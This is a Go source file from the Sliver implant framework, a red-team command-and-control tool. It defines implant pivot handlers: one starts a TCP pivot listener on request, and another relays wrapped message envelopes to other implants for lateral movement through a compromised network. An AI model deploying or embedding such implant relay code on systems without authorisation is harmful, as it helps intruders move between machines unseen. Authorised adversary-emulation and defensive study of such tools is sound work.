package handlers

import (
  // {{if .Debug}}
  "log"
  // {{end}}

  "github.com/bishopfox/sliver/protobuf/commonpb"
  "github.com/bishopfox/sliver/protobuf/sliverpb"
  "github.com/bishopfox/sliver/sliver/pivots"
  "github.com/bishopfox/sliver/sliver/transports"
  "github.com/golang/protobuf/proto"
)

/*
  Sliver Implant Framework
  Copyright (C) 2019  Bishop Fox

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

var (
  genericPivotHandlers = map[uint32]PivotHandler{
	sliverpb.MsgPivotData:   pivotDataHandler,
	sliverpb.MsgTCPPivotReq: tcpListenerHandler,
  }
)

// GetPivotHandlers - Returns a map of pivot handlers
func GetPivotHandlers() map[uint32]PivotHandler {
	return genericPivotHandlers
}

func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	tcpPivot := &sliverpb.TCPPivotReq{}
	err := proto.Unmarshal(envelope.Data, tcpPivot)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		tcpPivotResp := &sliverpb.TCPPivot {
	  		Success: false,
	  		Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(tcpPivotResp)
		connection.Send <- &sliverpb.Envelope {
	  		ID:   envelope.GetID(),
	  		Data: data,
	  	}
		return
	}
	err = pivots.StartTCPListener(tcpPivot.Address)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		tcpPivotResp := &sliverpb.TCPPivot {
	  		Success: false,
	  		Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(tcpPivotResp)
		connection.Send <- &sliverpb.Envelope {
	  		ID:   envelope.GetID(),
	  		Data: data,
	  	}
		return
	}
	tcpResp := &sliverpb.TCPPivot {
		Success: true,
	}
	data, _ := proto.Marshal(tcpResp)
	connection.Send <- &sliverpb.Envelope {
		ID:   envelope.GetID(),
		Data: data,
	}
}

func pivotDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	pivData := &sliverpb.PivotData{}
	proto.Unmarshal(envelope.Data, pivData)

	origData := &sliverpb.Envelope{}
	proto.Unmarshal(pivData.Data, origData)

	pivotConn := pivots.Pivot(pivData.GetPivotID())
	if pivotConn != nil {
		pivots.PivotWriteEnvelope(pivotConn, origData)
	} else {
		// {{if .Debug}}
		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
		// {{end}}
	}
}
